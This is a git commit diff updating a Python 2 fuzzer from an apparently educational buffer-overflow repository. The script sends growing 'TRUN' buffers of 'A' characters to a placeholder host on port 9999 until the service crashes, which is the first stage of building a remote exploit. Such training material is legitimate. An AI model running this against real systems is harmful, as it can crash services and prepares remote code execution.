5a209dd6eb1951401eceff2582b34044734eb7ce
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-07 16:31:26 -0400

    Update Fuzzer.py

--- Buffer_Overflow/Remote_Buffer_Overflow/Fuzzer.py
+++ Buffer_Overflow/Remote_Buffer_Overflow/Fuzzer.py
@@ -2,28 +2,31 @@
 import sys, socket
 from time import sleep
 
-# Change IP and Port on line 18 to Target and Port Application is running on
-# Change TRUN on line 19 to Command you are testing
+# Change IP and Port on line 17 to Target and Port Application is running on
+# Change TRUN on line 22 to Command you are testing
 
 size = 100
 
 while True:
-        try:
-                print "\nSending evil buffer with %s bytes" % size
+    try:
+        
+        buffer = "A" * size
                 
-                buffer = "A" * size
+        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                 
-                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-                
-                s.connect(("x.x.x.x", 9999))
-                s.send(('TRUN /.:/' + buffer))
-                
-                s.close()
-                
-                size += 100
-                sleep(1)
-                
-              
-        except:
-                print "\nFuzzing crashed at %s bytes" % str(len(buffer))
-                sys.exit()
+        s.connect(("x.x.x.x", 9999))
+        data = s.recv(1024)
+
+        print "\nSending evil buffer with %s bytes" % size
+        
+        s.send(('TRUN /.:/' + buffer))
+        s.close()
+        size += 100
+
+        print data
+
+        sleep(1)
+
+    except:            
+        print "\nFuzzing crashed at %s bytes" % str(len(buffer))
+        sys.exit()
